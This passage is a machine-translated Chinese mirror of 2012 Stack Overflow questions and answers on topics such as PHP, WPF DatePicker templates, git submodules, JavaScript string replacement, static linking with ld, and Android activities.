$count = count(glob("images/*.jpg"));

echo "In images have $count images"; 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-02T18:47:04.197

尝试这个：-

```
<?php

$directory='images';
$count=0;
$full_images='';

if($handle = opendir($directory)) {

  while (false !== ($file = readdir($handle))) {

    if(is_dir($directory.'/'.$file))
    {
    if($handle1 = opendir($directory.'/'.$file."/full")) {

      while (false !== ($file1 = readdir($handle1))) {
        if(!is_dir($file1))
         {
            $count=$count+1;
        $full_images[$file]['full'][]=$file1;
          } 
      }
    }
    }
  }

closedir($handle);
}

echo "Total count images in all of the full directories in: <b>".$count."</b> <br />";

foreach($full_images as  $k => $v)
{
  foreach($v as $key)
  {
    echo "Total count images in ".$k."\'s full directory in:  <b>".count($key)."</b><br />";
  }

}
?> 
```

# spark-view-engine - 如何将 htmlHelpers 添加到 Spark 视图中

> ID：11782458
> 
> 赞同：2
> 
> 时间：2012-08-02T17:09:45.290
> 
> 标签：spark-view-engine, nancy

我想在我的 spark 视图中使用 htmlHelpers，但我不断收到以下错误。

> 错误 CS0234：命名空间“System.Web”中不存在类型或命名空间名称“Mvc”（您是否缺少程序集引用？）

我已将 System.Web.Mvc 程序集添加到项目中。我还在模块中添加了以下代码（只是为了让它正常工作——我可能需要将此代码添加到引导程序中——还不知道该怎么做！）

```
var settings = new SparkSettings()
 .SetDebug(true)
 .SetAutomaticEncoding(true)
 .AddAssembly("System.Web")
 .AddAssembly("System.Web.Mvc")
 .AddNamespace("System.Web.Mvc")
 .AddNamespace("System.Web.Mvc.Html"); 
```

我还尝试将命名空间添加到 _global.spark 文件

有人可以告诉我我必须做什么才能在我的 spark 视图中使用 htmlHelpers。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-08T15:38:52.727

Nancy 的默认 Spark 基本视图不包括该`public HtmlHelper Html { get; set; }`属性。

您可以[在此处查看默认视图](https://github.com/NancyFx/Nancy/blob/master/src/Nancy.ViewEngines.Spark/NancySparkView.cs)。

为 MVC 集成实现的 Spark 视图[在此处](https://github.com/SparkViewEngine/spark/blob/master/src/Spark.Web.Mvc/SparkView.cs)，您将看到该`Html`属性公开，它允许您的 Spark 视图访问它并调用帮助程序。

理论上，您可以从 继承`NancySparkView`，并将其指定为 Spark 设置中的基本视图，并`System.Web.Mvc`在该类中添加该属性以及对 etc 的引用，然后假设所有内容都正确引用，您的视图应该能够调用帮助程序。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-03T10:37:29.300

我不是 Nancy 专家，但我确信 View 的类型与 Asp.Net MVC 的类型不同。因此，理论上，您不应该使用 MVC 助手，因为它们需要视图上的 Html 属性。

# c# - DatePicker 自定义模板在里面留下一个白框

> ID：11782462
> 
> 赞同：2
> 
> 时间：2012-08-02T17:09:51.783
> 
> 标签：c#, wpf, datepicker

我正在尝试为我的程序中的日期选择器制作一个自定义模板。我基本上使用此模板行进行行（更改颜色和事物）：

[http://msdn.microsoft.com/en-us/library/cc278067(v=vs.95).aspx](http://msdn.microsoft.com/en-us/library/cc278067(v=vs.95).aspx)

我已经尝试过它并摆脱这个白框（**日期选择器文本框内的那个）**，但它正在逃避我。这是我所看到的屏幕截图：

![在此处输入图像描述](../Images/4724c8e23ea27409b3497bb98505aefe.png)

我需要添加一些额外的东西吗？或者改变一些现有的价值观？如果有帮助，还有一个 MouseOver 事件可以用蓝色窗口渐变突出显示白框。

对于以后遇到这个问题的人，我按照布赖恩的建议做了，只是想我会准确地发布我的代码，所以其他人可以使用它；）我只是将它添加到 app.xaml

```
<Style x:Key="{x:Type DatePickerTextBox}" TargetType="{x:Type DatePickerTextBox}">        
    <Setter Property="Template">
        <Setter.Value>
            <ControlTemplate TargetType="{x:Type DatePickerTextBox}">

                <Grid>
                    <Border x:Name="watermark_decorator" BorderBrush="{DynamicResource cControlColor}" BorderThickness="1" 
                                Background="{DynamicResource cControlColor}"/>     
                </Grid>
            </ControlTemplate>
         </Setter.Value>
    </Setter>
</Style> 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-02T18:08:50.760

编辑：更新，因为澄清指向“在此处输入文本”周围的白色矩形。

为此，您需要为该模板创建一个自定义模板，该模板在`DatePickerTextBox`该模板下方约 2/3 处定义，并命名为 TextBox。您最好的选择是使用 Blend 创建一个自定义模板（因为它将生成默认模板），然后修改`<Border x:Name="watermark_decorator".../>`以更改`BorderBrush`. 例如：

```
<Style x:Key="MyDatePickerTextBoxStyle" TargetType="{x:Type DatePickerTextBox}">
    <Setter Property="Template">
       <Setter.Value>
         <ControlTemplate TargetType="{x:Type DatePickerTextBox}">
           <Grid>                 
           <!-- Visual State Manager stuff -->
             <Border...>
               <!-- other stuff... -->
               <Border x:Name="watermark_decorator" BorderBrush="[THE BRUSH YOU WANT]" BorderThickness="1">
                 <!-- And so on and so forth... -->
               </Border>
             </Border>
           </Grid>
         </ControlTemplate>
    </Setter>
</Style> 
```

然后，在`DatePicker`模板中，修改 DatePickerTextBox 以使用此样式：

```
<!-- All DatePicker Template stuff -->
<controlsPrimitives:DatePickerTextBox x:Name="TextBox" Style="{DynamicResource MyDatePickerTextBoxStyle}" ... /> 
```

你说的是上面有 15 的按钮吗？如果是这样，这部分的外观`DatePicker`在模板的“DropDownButtonTemplate”部分中定义。此模板包含一个很大的`VisualStateManager`部分，但随后定义了该按钮的模板。有一些注释定义了按钮模板的开始和结束：

```
<!--Start UI-->
... this is the Button Template ...
<!-- End UI--> 
```

例如，如果要更改按钮顶部的蓝色矩形的颜色，MSDN 示例使用此：

```
<Rectangle Grid.ColumnSpan="4" Grid.RowSpan="1" StrokeThickness="1">
  <Rectangle.Stroke>
    <LinearGradientBrush EndPoint="0.48,-1" StartPoint="0.48,1.25">
       <GradientStop Color="#FF494949" />
       <GradientStop Color="#FF9F9F9F" Offset="1" />
    </LinearGradientBrush>
  </Rectangle.Stroke>
  <Rectangle.Fill>
    <LinearGradientBrush EndPoint="0.3,-1.1" StartPoint="0.46,1.6">
      <GradientStop Color="#FF4084BD" />
      <GradientStop Color="#FFAFCFEA" Offset="1" />
    </LinearGradientBrush>
  </Rectangle.Fill>
</Rectangle> 
```

您只需将其更改为以下内容即可将其更改为纯色：

```
<Rectangle Grid.ColumnSpan="4" Grid.RowSpan="1" StrokeThickness="1" Stroke="Black" Fill="Green"/> 
```

“白框”实际上是`Border`带有 的模板内部`x:Name="BackgroundGradient"`，因此如果更改该元素的背景，则可以摆脱白色。

# android - 如何使用phonegap在android模拟器中播放视频？

> ID：11782465
> 
> 赞同：1
> 
> 时间：2012-08-02T17:09:54.270
> 
> 标签：android, android-layout, android-video-player

如何使用phonegap在android模拟器中播放视频？

```
 $(document).ready(function(){

        $("#ytplayer").attr('src', 'http://www.youtube.com/embed/' + getValue("id") +'?autoplay=1&origin=http://example.com');
        $("#back").click(function(){
          window.location.href = "moves.html?day=" + getValue("day") + "&week=" + getValue("week") + "&tier=" + getValue("tier");

        });
    }); 
```

# video - 如何使用 gstreamer 从 IP 摄像机文件接收视频

> ID：11782466
> 
> 赞同：1
> 
> 时间：2012-08-02T17:09:57.947
> 
> 标签：video, camera, ip, gstreamer

有没有办法将网络摄像机中的提要转储到媒体文件中，比如 mp4 格式？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-02T19:26:05.250

取决于您从 IP 摄像机收到的内容。如果您已经获得编码数据（例如 http+mjpeg 或 rtp+mpeg4/h264），那么您可以对它进行复用（例如使用 mp4mux !filesink）。

# git - 使用 Git 子模块来管理 3rd 方依赖项？

> ID：11782470
> 
> 赞同：2
> 
> 时间：2012-08-02T17:10:12.300
> 
> 标签：git, git-submodules

我目前正在运行测试以查看 Git 子模块如何工作，希望我可以使用它们来管理 3rd 方依赖项。

在我的本地测试中，我有一个文件夹，其中包含我的主要 Git 存储库。然后我有一个名为的子文件夹`scripts`，其中有一个为 GitHub 存储库创建的子模块[https://github.com/jrburke/requirejs/](https://github.com/jrburke/requirejs/)

当我最初设置子模块时，我显然得到了该 3rd 方回购中的所有文件/文件夹，但我感兴趣的唯一文件是`require.js`文件（[https://github.com/jrburke/requirejs/blob/master/ require.js](https://github.com/jrburke/requirejs/blob/master/require.js)）我提交了我的更改，包括删除了所有冗余文件/文件夹，然后等待 RequireJs 对其代码进行更改。

当我`git pull`编辑发生更改时，似乎每个更改的文件都会被拉下？即使在我的仓库中我已将它们提交为已删除，似乎子模块无论如何都会拉下任何已更改的文件，即使我显然不想要它们。

所以这是问题一。第二个问题是我再次删除文件并提交但由于合并问题而无法提交？但我无法合并它们，因为我已经删除了它们！我以前见过这个，显然解决方案是进入一个特定的 .git 文件夹并删除文件，这样它们就无法被引用，但这似乎是管理第 3 方依赖项的大量工作？

我只想克隆一个 repo，删除任何我不想要的文件，并`git pull`在我听到关于 3rd 方代码的更新时运行。有什么方法可以实现这一点吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-03T06:15:35.783

> 当更改发生时，我 git 拉进来，似乎每个更改的文件都会被拉下？

当然可以：您的父仓库仍然引用上游`jrburke/requirejs`仓库的 SHA1 引用其全部内容。

如果您真的想将该 repo 的修改版本作为子模块进行管理，您需要：

*   分叉那个回购
*   将你的 fork 添加为子模块
*   删除除一个以外的所有文件
*   git commit 在那个子模块中，然后推送到你的 fork
*   添加为名为“requirejs”的新远程，指向`jrburke/requirejs`repo
*   回到你的父仓库并再次提交（记录你的子模块的新状态）

然后，在子模块中，您可以“ `git fetch requirejs`”，仅将您感兴趣的文件合并到您自己的版本，提交并将其推送到您的 fork。
与往常一样，不要忘记返回您的父仓库并再次提交。

# notepad++ - Consolas 空格长度比 Notepad++ 中的预期短

> ID：11782472
> 
> 赞同：5
> 
> 时间：2012-08-02T17:10:17.667
> 
> 标签：notepad++

我在 Notepad++ 中为 Haml 文件创建了一种用户定义的语言。它具有全面的 Consolas/10。除了空格与字母的长度不同外，样式应用得很好。有什么问题？

![用户定义语言的控制台](../Images/45fb33deda8a6cdc94c37778f92b871a.png)

**更新：**

如果我将 Ruby 语言字体设置为 Consolas/10，则空格的长度确实与字母相同。

![来自预定义语言的控制台](../Images/1b201eb21bbc48eda10f1341fd4edd1a.png)

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-08-02T19:24:38.253

在模板文件的末尾有一个 GlobalStyles 部分。到处设置 fontName="Consolas" 。重新启动 Notepad++ 以使更改生效。

在我的例子中，模板文件是“Plastic Code Wrap.xml”

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-02T17:22:50.657

我使用记事本++，并安装了一个版本的 Consolas。NPP 版本 6.1.3 (UNICODE) 似乎可以正确处理它。

我正在查看的文件是一个 C 源代码文件，其编码设置为“在没有 BOM 的情况下以 UTF-8 编码”。

在这种情况下，空格和字母具有相同的宽度。

这不能回答您的问题，但也许它会为您的搜索添加信息。

——卡尔

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2017-03-10T18:18:34.153

这是导致问题的样式中的粗体设置。您必须在全局样式中“启用全局粗体字体样式”。我猜斜体也可能导致同样的问题。

# python - 用于缓存文件夹、文件和大小的 Python 高效结构

> ID：11782475
> 
> 赞同：3
> 
> 时间：2012-08-02T17:10:41.173
> 
> 标签：python, macos, caching, tree, directory

我正在用 Python 编写一个磁盘空间使用程序，并且我已经拥有了我想要的功能，但是速度很慢。我将分析的文件系统可能是数百 GB，在许多深度密集的文件夹中包含数千个文件。

我正在使用基于前面链接的论文中的“拆分”布局的树形图来显示数据。布局的创建和求解都是非常快速的操作。 [http://www.nada.kth.se/utbildning/grukth/exjobb/rapportlistor/2005/rapporter05/engdahl_bjorn_05033.pdf](http://www.nada.kth.se/utbildning/grukth/exjobb/rapportlistor/2005/rapporter05/engdahl_bjorn_05033.pdf)

我正在使用 os.walk 行走给定的路径，并将文件夹和文件连同它们的大小一起添加到这个树图中。我得到每个文件的大小并将其存储在字典缓存中（其中 cache[filePath] = size），因此我可以轻松地再次检索它。所有这些都很快，除了 os.walk。单独运行 os.walk 可能需要 30 多秒，有时是几分钟。

我知道我不能让它更快地通过结构，但我想以某种方式缓存结果，以便将来它更快。这是因为该应用程序允许导航树状图，您可以在其中单击任何部分（这是一个文件夹），它将使其成为树状图的“根”。

所以，我需要一个缓存解决方案，它可以轻松访问任何文件/文件夹，以及在层次结构中轻松导航，这样如果我从“根”节点开始，我可以跳到任何指定的子节点任何深度，然后从那里我可以在结构中向上（或向下）移动。

我宁愿不将数据结构和导航合并到树状图中。如果解决方案是在程序的步行和调整大小部分，那将是最好的。最后，我真的只需要一个可步行的文件/文件夹结构及其大小的重建。

这种结构有什么好的库吗？或者自己写这个有多容易？我以前没有使用过这样的结构，所以我不知道创建它的最佳方法，以便我拥有所需的访问类型。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-02T17:34:55.757

Have you looked into [Redis](http://redis.io/)? Its fast, and plays well with Python. Also, what about multiple threads/processes that are initiated at a fork to do the searching faster?

[redis-py](https://github.com/andymccurdy/redis-py)

# javascript - 在javascript中替换字符串中的多个字符

> ID：11782481
> 
> 赞同：11
> 
> 时间：2012-08-02T17:11:08.343
> 
> 标签：javascript, html, variables, cookies, replace

我得到了这个很好的代码，我不知道为什么它不起作用。出于兼容性目的，它应该获取文本输入的值并将每个给定的国家字符替换为其 HTML 代码。但是，当我单击按钮时，该函数将返回字符串而不做任何更改。任何的想法？

（[jsfiddle](http://jsfiddle.net/NuCdS/)）

```
<a id="reminder1" onclick="document.getElementById('reminder2').style.display = ''; document.getElementById('reminder1').style.display = 'none';">
    Set reminder
</a>
<a id="reminder2" class="reminder" style="display:none;">
    <input type="text" id="reminderh" size=40 style="font-size:20px;">
    <input type="button" value="Set" onclick="csere(document.getElementById('reminderh').value);">
</a>

<script>
function csere(qwe){
document.getElementById('reminder2').style.display = 'none';

var rtz0  = qwe.replace("á","&aacute;");
var rtz1  = rtz0.replace("Á","&Aacute;");

var rtz2  = rtz1.replace("é","&eacute;");
var rtz3  = rtz2.replace("É","&Eacute;");

var rtz4  = rtz3.replace("í","&iacute;");
var rtz5  = rtz4.replace("Í","&Iacute;");

var rtz6  = rtz5.replace("ö","&ouml;");
var rtz7  = rtz6.replace("Ö","&Ouml;");
var rtz8  = rtz7.replace("ő","&&#337;");
var rtz9  = rtz8.replace("Ő","&#336;");
var rtz10 = rtz9.replace("ó","&oacute;");
var rtz11 = rtz10.replace("Ó","&Oacute;");

var rtz12 = rtz11.replace("ü","&uuml;");
var rtz13 = rtz12.replace("Ü","&Uuml;");
var rtz14 = rtz13.replace("ű","&#369;");
var rtz15 = rtz14.replace("Ű","&#368;");
var rtz16 = rtz15.replace("ú","&uacute;");
var uio = rtz16.replace("Ú","&Uacute;");

//Creates a cookie with the final value (different function)
createCookie('reminder',uio,1500);

document.getElementById('reminder1').style.display = '';
}
</script> 
```

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2012-08-02T17:25:59.330

您可以为每个要替换的字符创建一个具有键/值对的对象：

```
var chars = {
    "á" : "&aacute;",
    "Á" : "&Aacute;",
    "é" : "&eacute;",
    "É" : "&Eacute;",
    ...
} 
```

然后在你的调用中使用一个函数`.replace`：

```
var uio = qwe.replace(/[áÁéÉ]/g,function(c) { return chars[c]; }); 
```

您的对象和正则表达式显然需要增长以包含您要替换的所有字符

* * *

## 回答 #2

> 赞同：9
> 
> 时间：2012-08-02T17:36:47.807

您可以以编程方式[替换](https://developer.mozilla.org/en/JavaScript/Reference/Global_Objects/String/replace)所有内容，而不是使用命名实体：

```
return input.replace(/[^ -~]/g, function(chr) {
//                    ^^^^^^ 
// this is a regexp for "everything than printable ASCII-characters"
// and even works in a ASCII-only charset. Identic: [^\u0020-\u007E]
    return "&#"+chr.charCodeAt(0)+";";
}); 
```

如果你想使用命名实体，你可以将它与键值映射结合起来（就像@jackwanders 的答案一样）：

```
var chars = {
    "á" : "&aacute;",
    "Á" : "&Aacute;",
    "é" : "&eacute;",
    "É" : "&Eacute;",
    ...
}
return input.replace(/[^ -~]/g, function(chr) {
    return (chr in chars) 
      ? chars[chr]
      : "&#"+chr.charCodeAt(0)+";";
}); 
```

* * *

但是，您永远不需要在 JavaScript 中使用 html 实体。使用 UTF8 作为所有字符的编码，它会起作用。

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2012-08-02T17:27:27.890

字符受制于 HTML 页面、JavaScript 页面和 HTTP 请求的编码。尝试用它们的 Unicode 等价物替换字符：

```
<a id="reminder1" onclick="document.getElementById('reminder2').style.display = ''; document.getElementById('reminder1').style.display = 'none';">
    Set reminder
</a>
<a id="reminder2" class="reminder" style="display:none;">
    <input type="text" id="reminderh" size=40 style="font-size:20px;">
    <input type="button" value="Set" onclick="csere(document.getElementById('reminderh').value);">
</a>

<script>
function csere(qwe){
document.getElementById('reminder2').style.display = 'none';

var rtz0  = qwe.replace(/\u00E1/,"&aacute;");
var rtz1  = rtz0.replace(/\u00C1/,"&Aacute;");

var rtz2  = rtz1.replace(/\u00E9/,"&eacute;");
var rtz3  = rtz2.replace(/\u00C9/,"&Eacute;");

var rtz4  = rtz3.replace(/\u00ED/,"&iacute;");
var rtz5  = rtz4.replace(/\u00CD/,"&Iacute;");

var rtz6  = rtz5.replace(/\u00F6/,"&ouml;");
var rtz7  = rtz6.replace(/\u00D6/,"&Ouml;");
var rtz8  = rtz7.replace(/\u00F5/,"&&#337;");
var rtz9  = rtz8.replace(/\u00D5/,"&#336;");
var rtz10 = rtz9.replace(/\u00F3/,"&oacute;");
var rtz11 = rtz10.replace(/\u00D3/,"&Oacute;");

var rtz12 = rtz11.replace(/\u00FC/,"&uuml;");
var rtz13 = rtz12.replace(/\u00DC/,"&Uuml;");
var rtz14 = rtz13.replace(/\u0171/,"&#369;");
var rtz15 = rtz14.replace(/\u0170/,"&#368;");
var rtz16 = rtz15.replace(/\u00FA/,"&uacute;");
var uio = rtz16.replace(/\u00DA/,"&Uacute;");

//Creates a cookie with the final value (different function)
createCookie('reminder',uio,1500);

document.getElementById('reminder1').style.display = '';
}
</script> 
```

仔细检查我的转换以确定。我在[Wikibooks](http://en.wikibooks.org/wiki/Unicode/Character_reference/0000-0FFF)上使用了网格。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-08-02T17:15:10.020

我认为您在仅替换字符的第一个实例时遇到问题。在 javascript 中，您必须使用正则表达式指定全局替换，如下所示：

```
var rtz0  = qwe.replace(new RegExp("á", "g"), "&aacute;"); 
```

最好创建一个 PPvG 或 jackwanders 提到的数组，否则至少重用现有变量。您可以像这样轻松地做到这一点：

```
qwe  = qwe.replace(new RegExp("á", "g"), "&aacute;");
qwe  = qwe.replace(new RegExp("Á", "g"), "&Aacute;"); 
```

# iphone - 如何从 UIImage 中获取信息

> ID：11782483
> 
> 赞同：0
> 
> 时间：2012-08-02T17:11:14.603
> 
> 标签：iphone, objective-c

> **可能重复：**
> [如何从 UIImage 获取 NSDATE？](https://stackoverflow.com/questions/5276456/how-to-get-a-nsdate-from-uiimage)

嗨，我需要从 UIImage 获取一些信息。例如，我需要获取拍摄照片的日期等。我不知道该怎么做。

有什么帮助吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-02T17:14:02.700

您想使用 CGImageSourceRef 而不是 UIImage，请参阅[CGImageSourceRef 文档](http://developer.apple.com/library/ios/#documentation/GraphicsImaging/Reference/CGImageSource/Reference/reference.html)。然后你使用像这样的代码

```
NSDictionary* metadata = (NSDictionary *)CGImageSourceCopyPropertiesAtIndex(source,0,NULL); 
```

获取元数据。[这里](http://caffeinatedcocoa.com/blog/?p=7)有详细教程。

# c++ - 如何告诉 ld 在哪里可以找到 libc

> ID：11782495
> 
> 赞同：3
> 
> 时间：2012-08-02T17:12:00.240
> 
> 标签：c++, gcc, linker, clang, opensuse

所以我今天用 C++ 创建了一个带有一些基本辅助功能的静态库。我用 Clang 3.2（SVN 快照）构建了它。但是，当我尝试运行链接到它的测试程序（prog.cpp）时，我收到以下错误：

```
~/Projects/CPP/AssisterLib> g++ prog.cpp -o 程序 -static -L。- 妹妹
/usr/lib64/gcc/x86_64-suse-linux/4.6/../../../../x86_64-suse-linux/bin/ld：找不到-lm
/usr/lib64/gcc/x86_64-suse-linux/4.6/../../../../x86_64-suse-linux/bin/ld：找不到-lc
collect2: ld 返回 1 个退出状态
```

我在 G++ 和 Clang++ 中遇到同样的错误。显然它找不到 libc.a 和 libm.a，它们都在 /usr/lib64 中（由 OpenSUSE 中的 glibc-devel 提供）。添加`-L/usr/lib64`对错误没有任何作用。

为什么 ld 找不到那些库？有没有我丢失的标志？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-02T20:08:06.757

问题很可能是使用`-static`. `libm`我会得出结论，你没有安装的静态版本`libc`。您可以尝试删除`-static`以确认。

该`-static`标志向编译器发出信号，表明您希望您的可执行文件完全静态链接，因此如果并非所有库都具有可用的静态版本，它就会失败。

# ios - 将 UI 导航控制器与 UITabBar 控制器相结合的最佳方式？

> ID：11782496
> 
> 赞同：0
> 
> 时间：2012-08-02T17:12:02.163
> 
> 标签：ios, xcode, uinavigationcontroller, uitabbarcontroller, uiwindow

我正在开发我正在开发的应用程序，为了完成给我的任务，似乎完成我需要的最好方法是将 a`UINavigationController`与 a结合起来`UITabBarController`。

在结构上，应用程序有一个主页，应用程序的其余部分通过 UITabBarController 进行导航。这是原版的声音设计，但是当我接手这个开发过程时，我不得不对应用程序进行大量添加，并且从技术上讲应该有一个“第二”部分添加额外的“功能”，如果你会发现不一定与应用程序本身的主要功能相关。

基本上，由于一切都从概览开始，因此用户应该可以在深入了解应用程序本身或使用其中一些额外功能之间做出选择。我认为导航控制器将适合额外功能，但我不确定如何添加它。

我需要知道的是 -**这个问题的解决方案是否合理？如果是这样，有什么好方法可以做到这一点？是否可以有一个单独的 UIWindow 类将导航控制器与 TabBar 控制器链接起来？**

诚然，这个应用程序使用了很多 nib 文件，每次我尝试以编程方式做某事时，它都没有奏效。因此，如果有人能指出实现这一目标的 NIB 方法，我将不胜感激。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-02T17:19:31.213

根据 Apple 的建议，`UITabBarController`应该始终是您应用的根视图控制器。所以基本上你的主视图只是你的标签视图控制器的一个标签，所以你只需要将你的主视图控制器嵌入到导航控制器中。这样，您可以使用导航控制器导航到该选项卡中您希望的任何页面，或者您可以使用选项卡控制器转到其他选项卡。

# php - php仅在body标签内获取图像

> ID：11782497
> 
> 赞同：0
> 
> 时间：2012-08-02T17:12:09.887
> 
> 标签：php, parsing, loops, tags

我需要做同样的事情：

```
$tags2 = $doc->getElementsByTagName('img');
$mybody = $doc->getElementsByTagName('body');
//if there's a body tag
foreach ($mybody as $bod){
            //loop through each img element
        foreach ($tags2 as $tag) {   
           echo  '<img src=' . $tag->getAttribute('src') . '/>';
           echo  "<br/>" . $tag->getAttribute('href') ; 
        }
} 
```

这是上下文：

```
$str = file_get_contents('http://somewebsite.html');

$doc = new DOMDocument();
@$doc->loadHTML('<?xml encoding="UTF-8">' . $str);

$tidy = new tidy();
$tidy->parseFile($str);
$tidy->cleanRepair();

if(!empty($tidy->errorBuffer)) {
        echo "The following errors or warnings occured:\n";
        echo $tidy->errorBuffer;
}
else {
    $str = $tidy;
}

$tags2 = $doc->getElementsByTagName('img');
$mybody = $doc->getElementsByTagName('body');
foreach ($mybody as $bod){
        foreach ($tags2 as $tag) {   
           echo  '<img src=' . $tag->getAttribute('src') . '/>';
           echo  "<br/>" . $tag->getAttribute('href') ; 
        }
} 
```

^ 输出页面、标题、侧边栏等中的所有图像以及正文中的图像。我只想要身体中的图像。我尝试了一些我在这里看到的使用递归的其他示例，但它们是为了获取样式或段落标签，我无法让它们正确检索图像标签和图像 src 属性。

拥有body标签后，如何对body中的任何图像进行内循环？

谢谢你。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-02T17:22:33.603

你只需要反转两行并重写一个smidgen。

```
$mybody = $doc->getElementsByTagName('body')->item(0);
$tags2 = $mybody->getElementsByTagName('img'); 
```

原因是 Body 标签实际上是该类的 DOMElement 实例，并且能够对`getElementsByTagName`.

# android - 如何检测任何类型的用户交互？

> ID：11782501
> 
> 赞同：6
> 
> 时间：2012-08-02T17:12:28.267
> 
> 标签：android, events, user-interaction

**安全问题：** *我现在不知道它是如何发生的，但是这个问题的读者提出了这个问题的解决方案是一个安全威胁的想法。所以请记住，我感兴趣的所有数据都是测量用户/活动的时间。就这样。用户做了什么——我根本**不**感兴趣！*

* * *

我需要的是非常简单的概念，但我找不到解决方案。我想运行一个进程（在后台）并监听用户交互。

所以，用户触摸屏幕——>我的方法被触发了。

用户解锁手机 --> 我的方法被触发。

物理键盘上的用户类型 --> 我的方法被触发。

所以简而言之，当手机仍然放在桌子上时，我的方法不会被触发 :-) 请注意，交互是与整个手机，而不是我的应用程序，我对用户输入字母“K”不感兴趣，我是甚至对用户输入的内容都不感兴趣，我只关心用户以某种方式使用手机。

顺便提一句。用户走路听音乐时的状态（手机放在口袋里）——这不是交互。

我正在寻找的是一个触发器——类似于`INTERACTION_DETECTED`，或者（相反地）一个回调方法，它设置`reportInactiveUser(10*1000)`为，如果用户不活动 10 秒，它将被调用。

**问题**如何检测用户交互？

*目的：测量手动使用手机的时间。*

## （缺乏）进展

我发现它`BatteryStatsImpl`可以保存我需要的数据。它的实例由 保存`BatteryStatsService`，但是它不允许任何访问它，只有`IBatteryStats`它又只有一个有趣`getStatistics`的方法 - 输出不包括用户活动计数器（或者它们全为零；我将所有权限设置为）。所以，到目前为止——运气不好。

所有调用都必须通过反射进行，因为这些类无论如何都不可用；-)。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-02T17:48:01.170

为此，您想拦截与手机的物理交互。

对于屏幕触摸，[这个包](http://developer.android.com/reference/android/gesture/package-summary.html)会派上用场。*您可以使用[它](http://developer.android.com/reference/android/view/GestureDetector.html)来收听屏幕上的手势。

对于物理按钮触摸，我建议你看看[这个](http://developer.android.com/reference/android/inputmethodservice/InputMethodService.html)。

# java - 如何在单独的 Activity 中从一个 Activity 修改 ArrayList

> ID：11782508
> 
> 赞同：0
> 
> 时间：2012-08-02T17:12:52.167
> 
> 标签：java, android

`Cars`我如何`ArrayList<Car>`从单独的文件中添加更多内容`Activity`？

因为我有这样的东西：

```
 private List<Car> getData() {

 List<Car> cars = new ArrayList<Car>();

cars.add(new Car("Dodge", "Viper"));

cars.add(new Car("Chevrolet", "Corvette"));

cars.add(new Car("Aston Martin", "Vanquish"));

cars.add(new Car("Lamborghini", "Diablo"));

cars.add(new Car("Ford", "Pinto"));

return cars;

} 
```

但是汽车只是示例，我在一个应用程序中有文本切换器，我想从文本切换器获取文本并将其作为新项目放置在具有列表视图的其他活动中。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-02T17:21:16.067

只需将您的 List 设为类变量并具有 addCar 功能

```
public void addCar(String make,String model){
      cars.add(new Car(make,model));
} 
```

并更改 getData()

```
 private List<Car> getData() {

            addCar("Dodge", "Viper");
            addCar("Chevrolet", "Corvette");
            etc...

        return cars;

    } 
```

在您的其他活动中只需调用 addCar(make,model)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-02T17:21:33.433

投入`cars`意图，它从第二个`Activity`开始`putExtra()`。然后检索它`getExtra()`并添加您想要的汽车。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-02T17:23:11.967

不能保证`Activity`一旦你离开另一个它就会存在于内存中（因为如果内存资源变低，系统可能会破坏它）。您应该将数据保存到持久性存储（即数据库或`SharedPreferences`）或将数据作为`Intent`额外数据传递。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-08-02T17:25:16.070

基本上，您需要将对象传递给另一个对象以`Activity`使用`Intents`. **然而**，这似乎很**不对劲**。我建议重新考虑如何`Cars`在`ArrayList`.`Activity`

正如 Harmeet Singh 所提到的，您可能想要考虑创建一个`sqlite`表格来容纳所有`Cars`. 然后你可以让你`ListView`有一个`CursorAdapter`正在看那张桌子的人。这将允许您`Cars`从任何地方添加，并且将更加灵活和更好的实践。

这里有两篇文章再次讨论将对象传递`Intents`给你的另一个`Activity`但是，我不建议你继续沿着这条路去实现你所要求的。`sqlite`和一个数据库表一起去。

1.  [如何在Android中将对象从一个活动传递到另一个活动](https://stackoverflow.com/questions/2736389/how-to-pass-object-from-one-activity-to-another-in-android)
2.  [如何在 Android 中的活动之间传递数据？](https://stackoverflow.com/questions/2091465/how-do-i-pass-data-between-activities-in-android)

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-08-02T17:33:07.583

我建议您应该使用类似**数据库**`sqllite`或共享一个**公共资源**（如`xml`文件或任何**永久存储**），这不是制作存储的方式，因为这种类型的存储是**volatile**。

如果内存在任何情况下都被清除，您的所有数据都会被**清除。**

看看[android持久化存储](http://developer.android.com/guide/topics/data/data-storage.html)

# subdomain - 在 Amazon 上扩展 ISP Config 3 子域磁盘大小

> ID：11782516
> 
> 赞同：0
> 
> 时间：2012-08-02T17:13:41.550
> 
> 标签：subdomain, amazon, expand

我在亚马逊上安装了 ISP Config 3，我刚刚将卷从 8gig 扩展到 30gig，当我 ssh 进入主 ispconfig 实例或任何子域实例时，我得到以下内容。但是当我尝试添加文件或编辑我的任何子域时，我得到“文件系统已满”。我如何编辑子域设置以便子域知道它有足够的空间？

```
 /dev/xvda1             30G  6.2G   22G  22% /
udev                  821M  4.0K  821M   1% /dev
tmpfs                 332M  240K  332M   1% /run
none                  5.0M     0  5.0M   0% /run/lock
none                  829M     0  829M   0% /run/shm
/dev/xvdb             147G  188M  140G   1% /mnt
/dev/mapper/vgpool-data
                      3.0G  2.9G   28K 100% /mnt/data 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-17T15:55:44.457
